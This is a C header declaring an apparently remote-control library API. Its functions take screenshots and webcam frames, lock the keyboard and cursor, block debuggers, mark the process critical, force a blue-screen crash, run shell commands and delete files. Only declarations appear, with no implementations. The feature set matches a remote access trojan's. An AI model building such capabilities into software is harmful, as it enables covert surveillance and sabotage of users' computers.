#pragma once

#include "standard.h"

#define DIR_CONTENT_PAGE_LIMIT 64

EXPORT UINT C_InitRuntimeLib();
EXPORT UINT C_InitSetProcessCritical(IN BOOL critical);

EXPORT         UINT C_ReSetWallpaper             (IN CWSTR imagePath);
EXPORT         UINT C_ReSetCursor                (IN CWSTR cursorPath);
EXPORT         UINT C_ReShowSafeMessage          (IN wchar_t* content, IN wchar_t* title, IN UINT style);
EXPORT         UINT C_ReTakeScreenshot           (IN CWSTR outputPath);
EXPORT         UINT C_ReTakeCameraFrame          (IN CWSTR outputPath);
EXPORT RUNTIME VOID C_ReLockCursorRuntime        (IN BOOL lock);
EXPORT RUNTIME VOID C_ReLockKeyboardRuntime      (IN BOOL lock);
EXPORT RUNTIME VOID C_ReLockProcessRuntime       (IN CWSTR procName, IN BOOL lock);
EXPORT         UINT C_ReLockProcessDebugger      (IN CWSTR procName, IN BOOL lock);
EXPORT         UINT C_ReTerminateProcess         (IN CWSTR procName);
EXPORT         UINT C_ReCreateProcess            (IN CWSTR executablePath);
EXPORT         UINT C_ReWriteFile                (IN CWSTR filePath, IN CWSTR data);
EXPORT         UINT C_ReDeleteFile               (IN CWSTR filePath);
EXPORT         UINT C_ReCreateDirectory          (IN CWSTR dirPath);
EXPORT         UINT C_ReDeleteDirectory          (IN CWSTR dirPath);
EXPORT         UINT C_ReInitBsod                 (IN UINT crashCode);
EXPORT         UINT C_ReShellInput               (IN CWSTR command, IN CWSTR cwdPath, OUT CWSTR output);
EXPORT         UINT C_ReGetDirContent            (IN CWSTR dirPath, OUT CWSTR content[DIR_CONTENT_PAGE_LIMIT], OUT UINT contentCount, IN UINT pageNumber);
EXPORT         VOID C_RePlayAudio                (IN CWSTR audioPath, IN FLOAT volume);
EXPORT         VOID C_ReStopAllAudios            ();
